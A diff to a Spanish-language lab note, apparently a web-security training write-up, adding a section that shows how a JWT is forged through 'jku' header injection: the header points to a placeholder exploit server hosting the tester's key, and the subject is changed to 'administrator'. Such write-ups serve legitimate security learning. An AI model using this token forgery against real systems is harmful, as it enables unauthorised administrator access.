@@ -15,6 +15,20 @@ tags:
 ## Qué muestra
 El server descarga la clave de verificación desde la **URL del header `jku`** sin validar el dominio. Apuntás `jku` a **tu exploit server**, que sirve **tu** clave pública.
 
+## JWT (original → modificado)
+
+**Original** (decodificado)
+```json
+{ "kid": "…", "alg": "RS256" }                                        // header
+{ "sub": "wiener" }                                                   // payload
+```
+**Modificado**
+```json
+{ "kid": "<tu-kid>", "alg": "RS256", "jku": "https://TU-EXPLOIT-SERVER/exploit" }   // header   ← agregado
+{ "sub": "administrator" }                                                          // payload  ← cambiado
+```
+> **Firma:** **re-firmada** con tu clave privada; el server baja tu JWKS desde el `jku` (el `kid` debe coincidir con el de tu clave).
+
 ## Diagrama
 
 ```mermaid
